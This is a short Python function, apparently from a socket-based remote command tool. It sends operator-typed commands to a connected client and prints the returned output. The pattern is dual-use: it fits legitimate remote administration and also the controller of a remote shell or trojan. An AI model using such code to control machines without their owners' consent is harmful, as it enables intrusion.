def execute_command(client_socket, client_address):
    try:
        command = input("Enter the command to execute on the client: ")
        client_socket.sendall(b"cmd")
        client_socket.sendall(bytes(command, 'utf-8'))
        output = client_socket.recv(4096).decode('utf-8')
        print(f"Output from client: {output}")
    except Exception as e:
        print(f"Error occurred - {e}")